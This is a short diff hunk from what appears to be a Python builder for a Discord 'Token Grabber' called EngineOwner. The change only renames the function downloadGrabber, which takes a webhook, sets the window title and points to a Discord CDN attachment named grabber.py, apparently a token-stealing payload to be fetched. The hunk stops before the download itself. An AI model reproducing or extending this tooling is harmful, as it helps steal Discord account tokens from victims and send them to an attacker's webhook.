@@ -36,7 +36,7 @@ ___________              .__                ________
 """
 option = Fore.RED + "     [>] "
 
-def downloadGrabber(webhook):
+def downloadgrabber(webhook):
     title2 = "EngineOwner ║ Token Grabber"
     system("title " + title2)
     url = 'https://cdn.discordapp.com/attachments/1014530090794766482/1014605376471183390/grabber.py'
